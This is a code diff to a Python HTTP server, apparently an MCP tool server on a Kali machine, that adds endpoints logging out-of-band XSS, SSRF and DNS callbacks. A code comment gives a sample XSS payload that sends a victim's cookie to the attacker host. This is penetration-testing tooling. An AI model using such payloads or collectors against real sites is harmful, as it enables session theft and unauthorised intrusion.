@@ -732,6 +732,9 @@ def run_command(cmd, timeout=60):
         return f"[erro: {e}]"
 
 
+# ── In-memory callback store (XSS / SSRF / OOB DNS hits) ─────────────────────
+_CALLBACKS = []  # list of dicts: {time, ip, path, data}
+
 # ── HTTP Handler ───────────────────────────────────────────────────────────────
 
 class MCPHandler(BaseHTTPRequestHandler):
@@ -763,6 +766,29 @@ class MCPHandler(BaseHTTPRequestHandler):
             self._cors()
             self.end_headers()
             self.wfile.write(b"pong")
+        elif path == "/callbacks":
+            body = json.dumps(_CALLBACKS[-100:]).encode()
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self._cors()
+            self.end_headers()
+            self.wfile.write(body)
+        elif path.startswith("/cb") or path.startswith("/xss") or path.startswith("/ssrf"):
+            # XSS/SSRF GET callback (e.g. <script src=http://kali:3000/cb?c=COOKIE>)
+            from urllib.parse import urlparse, parse_qs
+            qs = parse_qs(urlparse(self.path).query)
+            entry = {
+                "time": __import__('datetime').datetime.now().isoformat(),
+                "ip":   self.client_address[0],
+                "path": path,
+                "data": {k: v[0] for k, v in qs.items()},
+            }
+            _CALLBACKS.append(entry)
+            print(f"  [CALLBACK] {entry}")
+            self.send_response(200)
+            self._cors()
+            self.end_headers()
+            self.wfile.write(b"")
         else:
             self.send_response(404)
             self.end_headers()
